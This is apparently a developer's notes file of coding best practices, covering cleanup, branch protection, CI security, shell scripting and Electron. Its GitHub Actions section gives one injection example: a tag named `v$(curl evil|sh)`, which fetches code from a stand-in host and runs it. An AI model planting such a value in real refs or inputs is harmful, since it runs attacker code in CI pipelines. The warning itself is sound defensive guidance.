# Coding Best Practices & Reminders

> **Style rule:** Notes must be clear and concise — no filler, no restating the obvious — but long enough to carry the actual lesson: what went wrong, why, and the fix. A one-line rule without that context gets re-broken the next time someone hits a similar case. Group by topic, not by date. Whenever a PR review (CodeRabbit or human) catches a mistake, add or amend a note here right away so it isn't repeated.

## Resource Cleanup & Temporary Files

**IMPORTANT**: Always add proper cleanup code in programs to prevent lingering temp files after closing.

### Best Practices:

1. **GUI Applications (PyQt, Tkinter, etc.)**
   - Implement `closeEvent()` handler to cleanup resources on window close
   - Call `deleteLater()` on widgets to ensure proper Qt object cleanup
   - Process pending events with `app.processEvents()` before exit

2. **File Handling**
   - Use context managers (`with` statements) for file operations
   - Explicitly close file handles when not using context managers
   - Release file locks before program exit
   - Clean up temporary files in temp directories

3. **Background Threads & Workers**
   - Stop and join all background threads before exit
   - Cancel any pending operations
   - Clean up thread-specific resources

4. **Testing Cleanup**
   - After closing the program, verify the executable can be:
     - Deleted immediately
     - Moved to another location
     - Replaced with a new version
   - If the file is locked, cleanup code is missing or incomplete

### Example Implementation (PyQt6):

```python
def closeEvent(self, event):
    """Handle window close event - ensure proper cleanup"""
    # Cleanup modules/components
    for module in self.modules:
        try:
            module.cleanup()
        except Exception as e:
            print(f"Error cleaning up module: {e}")

    # Save state
    self.save_settings()

    # Accept close event
    event.accept()
    QApplication.quit()

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()

    exit_code = app.exec()

    # Final cleanup
    window.deleteLater()
    app.processEvents()

    sys.exit(exit_code)
```

### PyInstaller Specific:

In `.spec` file, add:
```python
exe = EXE(
    ...
    bootloader_ignore_signals=True,  # Better cleanup handling
    ...
)
```

## Date: 2025-12-16
This note was created based on issues encountered with PyInstaller executables remaining locked after closing.

## Branch Protection

- **GitHub branch protection requires a public repo, or GitHub Pro/Team/Enterprise, on private repos** — `PUT .../branches/.../protection` 403s with "Upgrade to GitHub Pro or make this repository public" otherwise. The bootstrap workflow handles this by warning and continuing, not failing the job — check the workflow run's log if a downstream repo's protection didn't apply.
- **Don't set required status-check contexts before the repo has CI that produces them.** A required context that never reports a status permanently blocks merges. `ci.yml` isn't part of the bootstrap file set (it needs per-project tailoring — see "tailor or language-agnostic" above), so bootstrap-time protection only sets what's safe without knowing future job names (no force-push, no deletion, enforced for admins); add required checks once that repo's own CI is customized and green.
- **Avoid `required_pull_request_reviews` on a solo-maintained repo.** GitHub won't let an author approve their own PR, so requiring even 1 approval with no other reviewer deadlocks every merge. Rely on required status checks (which do block direct pushes too, since a bare push's commit never gets the PR-triggered check runs) instead of an approval-count gate.
- **Renaming a CI job blocks every PR if its old name is a required check.** Required contexts match the check-run name exactly (including any matrix suffix), and the old one never reports again. Change the protection's required contexts in the same change that renames or splits a job, and confirm the PR shows as mergeable.

## Claude Code Hooks

- **Inspect every git invocation in a compound command.** `git add f && git commit` starts with `add`; split on `&&`, `||`, `;`, `|` and newlines and check each simple command, or the commit check never runs.
- **Plain stdout from a PreToolUse hook is only logged.** To show a warning, print JSON with `systemMessage` (user) and `hookSpecificOutput.additionalContext` (Claude); exit 0 without a permission decision so the call is not blocked.
- **Scope pattern checks to the file types they apply to.** A Python anti-pattern check must skip Markdown, or the docs that show the bad example trip it.

## General Style Notes

- **Keep lines under 120 characters.** Long lines are hard to review side-by-side in a diff or split editor pane, and tend to signal a line doing too many things at once. Wrap or break up expressions rather than letting them run long.
- **Add docstrings to explain code.** Focus on *why* a function/class exists or *why* it does something non-obvious — the code itself already shows *what* it does. A docstring worth writing usually covers intent, assumptions, edge cases, or a gotcha a future reader would otherwise have to rediscover the hard way.
- **Strip docstrings when building a release.** Release builds don't need internal rationale shipped alongside the binary — it bloats the artifact and can leak implementation notes you didn't mean to publish. Do not use Python's `-OO` by default: it also removes `assert` statements, so checks written as asserts vanish from the release. Use a step that strips only docstrings (for example a minifier's remove-literal-statements option), or confirm nothing relies on `assert` first.

## Releases

- **A green release rehearsal proves the pipeline, not the artifact.** Install, import or run what the rehearsal built, the way a user will, before tagging (Rule 4, "Rehearse before releasing").

## GitHub Actions Security

- **Declare `permissions: contents: read` at the workflow top level, override per-job where more is needed.** Without an explicit block, jobs inherit the repo's default token permissions, which can be broader than a job actually needs — a compromised step then has more reach than it should. Set the restrictive default once at the top, then add back only what a specific job genuinely needs (e.g. `contents: write` on a release-publishing job).
- **Pin third-party actions to a full commit SHA, not a version tag.** A tag (`@v4`) can be moved by whoever controls the upstream repo, silently changing what code runs in your workflow — including ones holding a write-capable token (e.g. `GITHUB_TOKEN` in a release job). Resolve the tag to its commit once (`gh api repos/<owner>/<repo>/commits/<tag> --jq .sha`) and pin to that, with the version as a trailing comment (`actions/checkout@<sha> # v7`) so it's still human-readable.
- **Never interpolate a GitHub expression directly into a `run:` script body.** `run: gh release create "${{ github.ref_name }}"` lets GitHub substitute that value into the script as raw text *before* the shell runs it — a crafted ref/branch/PR-title containing shell syntax (e.g. a tag named `v$(curl evil|sh)`) gets executed, not just printed. Route anything attacker-influenceable (ref names, PR titles/bodies, issue titles, commit messages) through a step `env:` var instead and reference it as a quoted shell variable (`"$RELEASE_TAG"`) — env vars are passed as data, not spliced into the script text.

## Node.js Child Processes

- **Piping two streams into one shared writable ends it when either source ends.** `child.stdout.pipe(logStream)` and `child.stderr.pipe(logStream)` both default to ending `logStream` when *their* source ends — whichever finishes first closes it, and the other stream's next write throws an unhandled write-after-end error. Pipe both with `{ end: false }` and close the shared stream yourself once you know both are done (e.g. on the child's `close` event, which fires after both stdio streams have finished).
- **A readiness poll must check child liveness and a real success signal, not just "did anything respond."** Polling a fixed URL/port until it answers can resolve on a stray response from an unrelated process already using that port, or on a transient error page the target itself returns while still starting up. Check the child process hasn't already exited (bail out immediately if it has — no point waiting out the full timeout), and only treat a specific expected success response (e.g. HTTP 200, not just "connected") as ready; keep polling past non-200 responses instead of accepting the first one.

## Shell Scripts

- **Don't write to a hardcoded, predictable path under `/tmp`.** On a shared machine another local user can pre-create that exact path (as a file or a symlink elsewhere) before your script runs, letting them read what you write or redirect it to overwrite something else (CWE-377). Use `mktemp` to get a unique, unpredictable path, and `trap 'rm -f "$tmpfile"' EXIT` to clean it up regardless of how the script exits.
- **Pass `GITHUB_TOKEN` to anonymous GitHub API calls made from CI, keep it optional for local use.** Unauthenticated REST API calls are capped at 60/hour per source IP; GitHub-hosted runners share a large, heavily-used IP pool that commonly already has that quota eaten by unrelated traffic. A transient 403 under `set -euo pipefail` + `curl -f` then kills the whole job for reasons unrelated to the actual code. The job already has `GITHUB_TOKEN` available (even if only used elsewhere) — pass it as an `Authorization: Bearer` header when set, and just fall back to anonymous when it isn't (e.g. a developer running the same script locally).

## Electron Main Process

- **`app.whenReady().then(boot)` needs a `.catch()`.** If anything inside `boot()` throws before the window is created (e.g. `fs.mkdirSync` failing on a userData subdirectory with restricted ACLs), that's an unhandled promise rejection — the app just sits running with no window, no dialog, and no clue why. Show the same kind of error dialog used for other startup failures (e.g. the spawn-failure path) and quit, rather than failing silently.

## GitHub Actions Workflow Inputs

- **A declared `workflow_dispatch` input that nothing references is misleading, not harmless.** Someone supplying `-f tag=v9.9.9-test` reasonably expects it to show up somewhere (artifact names, release notes, logs) — if it's silently dropped, the run looks like it respected their input when it didn't. Either wire it into the job for real, or at minimum surface it in the job summary so it's visibly acknowledged instead of silently ignored.
